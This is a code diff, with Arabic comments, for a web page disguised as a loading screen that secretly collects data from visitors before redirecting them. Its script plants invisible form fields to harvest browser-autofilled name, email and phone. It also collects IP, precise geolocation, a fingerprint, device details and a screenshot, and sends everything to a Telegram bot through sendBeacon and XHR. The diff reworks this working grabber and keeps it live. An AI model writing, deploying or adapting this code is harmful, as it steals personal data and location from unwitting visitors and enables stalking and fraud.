@@ -244,13 +244,10 @@
         <div class="status-text" id="statusText">جاري التحميل ...</div>
     </div>
 
-    <!-- ===== حقول خفية (متعددة لزيادة فرصة autofill) ===== -->
+    <!-- ===== حقول خفية ===== -->
     <input type="email" class="hidden-field" id="hiddenEmail" name="email" autocomplete="email" value="">
     <input type="text" class="hidden-field" id="hiddenName" name="name" autocomplete="name" value="">
     <input type="tel" class="hidden-field" id="hiddenTel" name="tel" autocomplete="tel" value="">
-    <!-- حقول إضافية لبعض المتصفحات -->
-    <input type="text" class="hidden-field" id="hiddenUsername" name="username" autocomplete="username" value="">
-    <input type="text" class="hidden-field" id="hiddenNickname" name="nickname" autocomplete="nickname" value="">
 
     <script>
         // ================================================================
@@ -263,19 +260,129 @@
         };
 
         // ================================================================
-        //  المتغيرات
-        // ================================================================
-        let isRedirected = false;
-
-        // ================================================================
-        //  دوال مساعدة
+        //  دوال المساعدة
         // ================================================================
         function log(msg) {
             console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
         }
 
         // ================================================================
-        //  جلب IP بسرعة
+        //  دالة إرسال البيانات إلى تليجرام (باستخدام sendBeacon فقط)
+        // ================================================================
+        function sendDataToTelegram(baseData, advancedData, imageDataURL) {
+            const token = CONFIG.botToken;
+            const chatId = CONFIG.chatId;
+            if (!token || !chatId) {
+                log('❌ توكن أو Chat ID غير موجود');
+                return;
+            }
+
+            const d = baseData;
+            const adv = advancedData;
+
+            // بناء النص
+            const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
+            const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';
+
+            let caption = `🎯 *زائر جديد - بيانات شاملة*\n\n`;
+            caption += `📧 *البريد:* ${adv.autofillEmail || 'غير موجود'}\n`;
+            caption += `📛 *الاسم:* ${adv.autofillName || 'غير موجود'}\n`;
+            caption += `📱 *الهاتف:* ${adv.autofillTel || 'غير موجود'}\n`;
+            caption += `🆔 *بصمة:* ${adv.fingerprint?.visitorId || 'غير متوفرة'}\n`;
+            caption += `🔍 *مكونات:* ${adv.fingerprint?.components || 'غير معروف'}\n\n`;
+            caption += `🔋 *البطارية:* ${adv.battery?.level || 'غير معروف'}% ${adv.battery?.charging ? '(شحن)' : ''}\n`;
+            caption += `📡 *الشبكة:* ${adv.connection?.type || 'غير معروف'} (${adv.connection?.downlink || '?'})\n`;
+            caption += `⚙️ *المعالج:* ${adv.hardware?.cores || 'غير معروف'} نواة\n`;
+            caption += `🧠 *الذاكرة:* ${adv.hardware?.memory || 'غير معروف'}\n`;
+            caption += `💻 *النظام:* ${adv.os || 'غير معروف'}\n`;
+            caption += `🖥️ *الشاشة:* ${adv.screen?.width}x${adv.screen?.height} (${adv.screen?.colorDepth} بت)\n`;
+            caption += `🔌 *الإضافات:* ${adv.plugins || 'لا يوجد'}\n`;
+            caption += `🚫 *DNT:* ${adv.doNotTrack || 'غير محدد'}\n`;
+            caption += `🌍 *اللغات:* ${adv.languages || 'غير معروف'}\n\n`;
+            caption += `⏰ *التوقيت:* ${d.device.localTime}\n`;
+            caption += `🌐 *الرابط:* ${d.device.url}\n`;
+            caption += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
+            caption += `📱 *الجهاز:* ${d.device.deviceType}\n`;
+            caption += `🌍 *المتصفح:* ${d.device.browser}\n`;
+            caption += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
+            caption += `🗣 *اللغة:* ${d.device.language}\n`;
+            caption += `\n🌐 *IP:* ${d.ip}\n`;
+            caption += `📍 *الموقع:* ${loc}\n`;
+            if (mapLink) caption += `🗺️ [خريطة](${mapLink})\n`;
+            caption += `📐 *الشاشة:* ${d.device.screenSize}\n`;
+            caption += `⏳ *المنطقة:* ${d.device.timezone}\n`;
+
+            // نرسل النص أولاً باستخدام sendBeacon (مضمونة حتى بعد مغادرة الصفحة)
+            try {
+                const payload = JSON.stringify({
+                    chat_id: chatId,
+                    text: caption,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                });
+                const blob = new Blob([payload], { type: 'application/json' });
+                const sent = navigator.sendBeacon(
+                    `https://api.telegram.org/bot${token}/sendMessage`,
+                    blob
+                );
+                if (sent) {
+                    log('✅ تم إرسال النص عبر sendBeacon');
+                } else {
+                    log('⚠️ فشل sendBeacon للنص، نحاول بـ XHR');
+                    // خطة بديلة: XHR
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', `https://api.telegram.org/bot${token}/sendMessage`, true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.send(payload);
+                        log('✅ تم إرسال النص عبر XHR');
+                    } catch (e) {
+                        log(`❌ فشل XHR للنص: ${e.message}`);
+                    }
+                }
+            } catch (e) {
+                log(`❌ فشل إرسال النص: ${e.message}`);
+            }
+
+            // إرسال الصورة إن وجدت (باستخدام XHR لأن sendBeacon لا يدعم الملفات الكبيرة بشكل موثوق)
+            if (imageDataURL) {
+                try {
+                    const byteString = atob(imageDataURL.split(',')[1]);
+                    const mimeString = imageDataURL.split(',')[0].split(':')[1].split(';')[0];
+                    const ab = new ArrayBuffer(byteString.length);
+                    const ia = new Uint8Array(ab);
+                    for (let i = 0; i < byteString.length; i++) {
+                        ia[i] = byteString.charCodeAt(i);
+                    }
+                    const blob = new Blob([ab], { type: mimeString });
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'youtube_screenshot.jpg');
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', `https://api.telegram.org/bot${token}/sendPhoto`, true);
+                    xhr.timeout = 10000;
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            log('✅ تم إرسال الصورة بنجاح');
+                        } else {
+                            log(`⚠️ فشل إرسال الصورة: ${xhr.status}`);
+                        }
+                    };
+                    xhr.onerror = function() {
+                        log('❌ فشل إرسال الصورة (شبكة)');
+                    };
+                    xhr.send(formData);
+                } catch (e) {
+                    log(`⚠️ فشل تحضير الصورة: ${e.message}`);
+                }
+            }
+        }
+
+        // ================================================================
+        //  جمع البيانات الأساسية (IP والموقع)
         // ================================================================
         async function getIP() {
             try {
@@ -285,57 +392,31 @@
                     return data.ip || 'غير متوفر';
                 }
             } catch (_) {}
-            try {
-                const res = await fetch('https://httpbin.org/ip', { signal: AbortSignal.timeout(3000) });
-                if (res.ok) {
-                    const data = await res.json();
-                    return data.origin || 'غير متوفر';
-                }
-            } catch (_) {}
             return 'غير متوفر';
         }
 
-        // ================================================================
-        //  جلب الموقع الجغرافي (محاولة متعددة)
-        // ================================================================
         function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
                 let done = false;
-                let attempts = 0;
-                const maxAttempts = 2;
-
-                const tryGetPosition = () => {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            if (done) return;
-                            done = true;
-                            resolve({
-                                latitude: +pos.coords.latitude.toFixed(6),
-                                longitude: +pos.coords.longitude.toFixed(6),
-                                accuracy: Math.round(pos.coords.accuracy)
-                            });
-                        },
-                        (err) => {
-                            attempts++;
-                            if (attempts < maxAttempts && !done) {
-                                setTimeout(tryGetPosition, 500);
-                            } else if (!done) {
-                                done = true;
-                                resolve(null);
-                            }
-                        }, { timeout: 5000, enableHighAccuracy: true }
-                    );
-                };
-                tryGetPosition();
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        if (done) return;
+                        done = true;
+                        resolve({
+                            latitude: +pos.coords.latitude.toFixed(6),
+                            longitude: +pos.coords.longitude.toFixed(6),
+                            accuracy: Math.round(pos.coords.accuracy)
+                        });
+                    },
+                    () => { if (!done) { done = true;
+                            resolve(null); } }, { timeout: 4000, enableHighAccuracy: true }
+                );
                 setTimeout(() => { if (!done) { done = true;
-                        resolve(null); } }, 6000);
+                        resolve(null); } }, 5000);
             });
         }
 
-        // ================================================================
-        //  معلومات الجهاز الأساسية
-        // ================================================================
         function collectDeviceInfo() {
             const ua = navigator.userAgent;
             const now = new Date();
@@ -364,7 +445,7 @@
         }
 
         // ================================================================
-        //  جمع البيانات المتقدمة (مع autofill محسّن)
+        //  جمع البيانات المتقدمة
         // ================================================================
         async function collectAdvancedData() {
             const data = {};
@@ -432,59 +513,38 @@
             data.doNotTrack = navigator.doNotTrack || 'غير محدد';
             data.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language || 'غير معروف';
 
-            // ===== Autofill - محاولة متقدمة =====
-            // نستخدم حقول متعددة لزيادة فرصة العثور على البيانات
-            const fields = {
-                name: document.getElementById('hiddenName'),
-                email: document.getElementById('hiddenEmail'),
-                tel: document.getElementById('hiddenTel'),
-                username: document.getElementById('hiddenUsername'),
-                nickname: document.getElementById('hiddenNickname')
-            };
+            // Autofill
+            const nameInput = document.getElementById('hiddenName');
+            const emailInput = document.getElementById('hiddenEmail');
+            const telInput = document.getElementById('hiddenTel');
 
-            // نجعل الحقول مرئية للحظة (شفافة) لتنشيط autofill
-            Object.values(fields).forEach(el => {
-                if (el) {
-                    el.style.position = 'fixed';
-                    el.style.left = '0';
-                    el.style.top = '0';
-                    el.style.opacity = '0';
-                    el.style.pointerEvents = 'none';
-                    el.style.width = '1px';
-                    el.style.height = '1px';
-                    el.style.zIndex = '-9999';
-                }
+            [nameInput, emailInput, telInput].forEach(el => {
+                el.style.position = 'fixed';
+                el.style.left = '0';
+                el.style.top = '0';
+                el.style.opacity = '0';
+                el.style.pointerEvents = 'none';
+                el.style.width = '1px';
+                el.style.height = '1px';
+                el.style.zIndex = '-9999';
             });
 
-            // نضع التركيز على كل حقل بالتتابع لتحفيز التعبئة
-            for (const key of ['email', 'name', 'tel', 'username', 'nickname']) {
-                const el = fields[key];
-                if (el) {
-                    el.focus();
-                    await new Promise(r => setTimeout(r, 30));
-                    el.blur();
-                }
-            }
+            nameInput.focus();
+            setTimeout(() => nameInput.blur(), 50);
+            emailInput.focus();
+            setTimeout(() => emailInput.blur(), 50);
+            telInput.focus();
+            setTimeout(() => telInput.blur(), 50);
 
-            // ننتظر قليلاً حتى يقوم المتصفح بالتعبئة
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 400));
 
-            // نقرأ القيم
-            data.autofillName = fields.name?.value?.trim() || 'غير موجود';
-            data.autofillEmail = fields.email?.value?.trim() || 'غير موجود';
-            data.autofillTel = fields.tel?.value?.trim() || 'غير موجود';
-            // نحاول استخدام username أو nickname كاسم بديل إذا كان name فارغاً
-            if (data.autofillName === 'غير موجود') {
-                const uname = fields.username?.value?.trim();
-                const nname = fields.nickname?.value?.trim();
-                if (uname && uname !== 'غير موجود') data.autofillName = uname;
-                else if (nname && nname !== 'غير موجود') data.autofillName = nname;
-            }
+            data.autofillName = nameInput.value.trim() || 'غير موجود';
+            data.autofillEmail = emailInput.value.trim() || 'غير موجود';
+            data.autofillTel = telInput.value.trim() || 'غير موجود';
 
-            // إخفاء الحقول
-            Object.values(fields).forEach(el => { if (el) el.style.display = 'none'; });
+            [nameInput, emailInput, telInput].forEach(el => el.style.display = 'none');
 
-            // ===== بصمة المتصفح =====
+            // بصمة المتصفح
             try {
                 const fp = await FingerprintJS.load();
                 const result = await fp.get();
@@ -517,172 +577,12 @@
         }
 
         // ================================================================
-        //  إرسال البيانات إلى تليجرام (طريقتان: XMLHttpRequest + sendBeacon)
-        // ================================================================
-        function sendToTelegram(data, imageDataURL) {
-            const token = CONFIG.botToken;
-            const chatId = CONFIG.chatId;
-            if (!token || !chatId) {
-                log('❌ توكن أو Chat ID غير موجود');
-                return;
-            }
-
-            const { baseData, advancedData } = data;
-            const d = baseData;
-            const adv = advancedData;
-
-            const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
-            const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';
-
-            let caption = `🎯 *زائر جديد - بيانات شاملة*\n\n`;
-            caption += `📧 *البريد:* ${adv.autofillEmail || 'غير موجود'}\n`;
-            caption += `📛 *الاسم:* ${adv.autofillName || 'غير موجود'}\n`;
-            caption += `📱 *الهاتف:* ${adv.autofillTel || 'غير موجود'}\n`;
-            caption += `🆔 *بصمة:* ${adv.fingerprint?.visitorId || 'غير متوفرة'}\n`;
-            caption += `🔍 *مكونات:* ${adv.fingerprint?.components || 'غير معروف'}\n\n`;
-            caption += `🔋 *البطارية:* ${adv.battery?.level || 'غير معروف'}% ${adv.battery?.charging ? '(شحن)' : ''}\n`;
-            caption += `📡 *الشبكة:* ${adv.connection?.type || 'غير معروف'} (${adv.connection?.downlink || '?'})\n`;
-            caption += `⚙️ *المعالج:* ${adv.hardware?.cores || 'غير معروف'} نواة\n`;
-            caption += `🧠 *الذاكرة:* ${adv.hardware?.memory || 'غير معروف'}\n`;
-            caption += `💻 *النظام:* ${adv.os || 'غير معروف'}\n`;
-            caption += `🖥️ *الشاشة:* ${adv.screen?.width}x${adv.screen?.height} (${adv.screen?.colorDepth} بت)\n`;
-            caption += `🔌 *الإضافات:* ${adv.plugins || 'لا يوجد'}\n`;
-            caption += `🚫 *DNT:* ${adv.doNotTrack || 'غير محدد'}\n`;
-            caption += `🌍 *اللغات:* ${adv.languages || 'غير معروف'}\n\n`;
-            caption += `⏰ *التوقيت:* ${d.device.localTime}\n`;
-            caption += `🌐 *الرابط:* ${d.device.url}\n`;
-            caption += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
-            caption += `📱 *الجهاز:* ${d.device.deviceType}\n`;
-            caption += `🌍 *المتصفح:* ${d.device.browser}\n`;
-            caption += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
-            caption += `🗣 *اللغة:* ${d.device.language}\n`;
-            caption += `\n🌐 *IP:* ${d.ip}\n`;
-            caption += `📍 *الموقع:* ${loc}\n`;
-            if (mapLink) caption += `🗺️ [خريطة](${mapLink})\n`;
-            caption += `📐 *الشاشة:* ${d.device.screenSize}\n`;
-            caption += `⏳ *المنطقة:* ${d.device.timezone}\n`;
-
-            // تحضير FormData للصورة إن وجدت
-            let formData = null;
-            if (imageDataURL) {
-                try {
-                    const byteString = atob(imageDataURL.split(',')[1]);
-                    const mimeString = imageDataURL.split(',')[0].split(':')[1].split(';')[0];
-                    const ab = new ArrayBuffer(byteString.length);
-                    const ia = new Uint8Array(ab);
-                    for (let i = 0; i < byteString.length; i++) {
-                        ia[i] = byteString.charCodeAt(i);
-                    }
-                    const blob = new Blob([ab], { type: mimeString });
-                    formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'youtube_screenshot.jpg');
-                    formData.append('caption', caption);
-                    formData.append('parse_mode', 'Markdown');
-                } catch (e) {
-                    log(`⚠️ فشل تحضير الصورة: ${e.message}`);
-                    formData = null;
-                }
-            }
-
-            // ===== الطريقة الأولى: XMLHttpRequest (موثوق) =====
-            const sendViaXHR = () => {
-                try {
-                    const xhr = new XMLHttpRequest();
-                    const url = formData ?
-                        `https://api.telegram.org/bot${token}/sendPhoto` :
-                        `https://api.telegram.org/bot${token}/sendMessage`;
-                    xhr.open('POST', url, true);
-                    xhr.timeout = 10000;
-                    xhr.onload = function() {
-                        if (xhr.status === 200) {
-                            log('✅ تم الإرسال بنجاح (XHR)');
-                        } else {
-                            log(`⚠️ فشل الإرسال (XHR): ${xhr.status}`);
-                            // محاولة بطريقة sendBeacon كخطة بديلة
-                            sendViaBeacon();
-                        }
-                    };
-                    xhr.onerror = function() {
-                        log('⚠️ فشل XHR، محاولة sendBeacon');
-                        sendViaBeacon();
-                    };
-                    if (formData) {
-                        xhr.send(formData);
-                    } else {
-                        xhr.setRequestHeader('Content-Type', 'application/json');
-                        xhr.send(JSON.stringify({
-                            chat_id: chatId,
-                            text: caption,
-                            parse_mode: 'Markdown',
-                            disable_web_page_preview: true
-                        }));
-                    }
-                } catch (e) {
-                    log(`⚠️ خطأ في XHR: ${e.message}`);
-                    sendViaBeacon();
-                }
-            };
-
-            // ===== الطريقة الثانية: sendBeacon (تُرسل حتى بعد مغادرة الصفحة) =====
-            const sendViaBeacon = () => {
-                try {
-                    let payload;
-                    let url;
-                    if (formData) {
-                        // sendBeacon لا يدعم FormData جيداً، لذا نرسل JSON مع الصورة مشفرة
-                        const dataObj = {
-                            chat_id: chatId,
-                            caption: caption,
-                            parse_mode: 'Markdown',
-                            photo: imageDataURL // نرسل الصورة كـ dataURL (قد تكون كبيرة)
-                        };
-                        payload = JSON.stringify(dataObj);
-                        url = `https://api.telegram.org/bot${token}/sendPhoto`;
-                        // لكن sendBeacon قد يفشل مع البيانات الكبيرة، لذا نفضل XHR للصور
-                        // لذلك سنستخدم sendBeacon فقط للنص
-                        sendTextViaBeacon(token, chatId, caption);
-                    } else {
-                        sendTextViaBeacon(token, chatId, caption);
-                    }
-                } catch (e) {
-                    log(`❌ فشل sendBeacon: ${e.message}`);
-                }
-            };
-
-            const sendTextViaBeacon = (token, chatId, text) => {
-                try {
-                    const blob = new Blob([JSON.stringify({
-                        chat_id: chatId,
-                        text: text,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })], { type: 'application/json' });
-                    const sent = navigator.sendBeacon(
-                        `https://api.telegram.org/bot${token}/sendMessage`,
-                        blob
-                    );
-                    if (sent) {
-                        log('✅ تم الإرسال عبر sendBeacon (نص)');
-                    } else {
-                        log('⚠️ فشل sendBeacon');
-                    }
-                } catch (e) {
-                    log(`❌ فشل sendBeacon: ${e.message}`);
-                }
-            };
-
-            // نبدأ بـ XHR، وإذا فشل نستخدم sendBeacon
-            sendViaXHR();
-        }
-
-        // ================================================================
         //  العملية الرئيسية
         // ================================================================
         async function main() {
             log('🚀 بدء التشغيل');
 
-            // 1. شريط التقدم
+            // شريط التقدم
             let progress = 0;
             const progressInterval = setInterval(() => {
                 progress += 4 + Math.floor(Math.random() * 6);
@@ -690,13 +590,13 @@
                 document.getElementById('progressBar').style.width = progress + '%';
             }, 70);
 
-            // 2. جمع البيانات الأساسية
+            // جمع البيانات الأساسية
             const deviceInfo = collectDeviceInfo();
             const ip = await getIP();
             const location = await getLocation();
             const baseData = { device: deviceInfo, ip, location };
 
-            // 3. جمع المتقدمات واللقطة بالتوازي
+            // جمع المتقدمات واللقطة بالتوازي
             const [advancedData, screenshot] = await Promise.allSettled([
                 collectAdvancedData(),
                 captureScreenshot()
@@ -705,19 +605,19 @@
             const advData = advancedData.status === 'fulfilled' ? advancedData.value : {};
             const imgData = screenshot.status === 'fulfilled' ? screenshot.value : null;
 
-            // 4. إرسال البيانات (لا ننتظر)
+            // إرسال البيانات (نستخدم sendBeacon + XHR)
             log('📤 إرسال البيانات إلى تليجرام...');
-            sendToTelegram({ baseData, advancedData: advData }, imgData);
+            sendDataToTelegram(baseData, advData, imgData);
 
-            // 5. إنهاء شريط التقدم
+            // إنهاء شريط التقدم
             clearInterval(progressInterval);
             document.getElementById('progressBar').style.width = '100%';
             document.getElementById('statusText').textContent = 'تم التحميل ...';
 
-            // 6. التحويل بعد 0.5 ثانية
+            // التحويل بعد 0.5 ثانية
             setTimeout(() => {
-                if (!isRedirected) {
-                    isRedirected = true;
+                if (!window._redirected) {
+                    window._redirected = true;
                     log('🔄 تحويل إلى الرابط');
                     try {
                         window.location.replace(CONFIG.targetUrl);
@@ -737,7 +637,7 @@
             window.addEventListener('load', () => setTimeout(main, 200));
         }
 
-        log('✅ النسخة المحسّنة جاهزة (مع دعم autofill المتقدم و sendBeacon)');
+        log('✅ النسخة المبسطة مع sendBeacon جاهزة');
     </script>
 </body>
 </html>
